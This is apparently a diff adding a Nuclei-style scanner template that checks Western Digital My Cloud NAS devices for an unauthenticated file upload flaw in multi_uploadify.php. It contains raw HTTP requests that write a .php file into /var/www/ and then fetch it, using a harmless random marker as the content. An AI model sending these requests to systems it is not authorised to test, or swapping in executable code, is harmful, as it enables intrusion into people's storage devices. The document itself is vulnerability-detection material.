@@ -1,0 +1,39 @@
+id: Western-NAS-multi_uploadify-upload
+
+info:
+  name: Western Digital My Cloud NAS multi_uploadify.php 文件上传漏洞
+  author: Western
+  severity: high
+  tags: Western
+
+http:
+  - raw:
+      - |
+        POST /web/jquery/uploader/multi_uploadify.php?folder=/var/www/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="Filedata[]"; filename="19f6e38f.php"
+        Content-Type: application/octet-stream
+        
+        {{randstr_1}}
+        ------WebKitFormBoundary--
+
+      - |+
+        GET /19f6e38f.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr_1}}'
+    matchers-condition: and
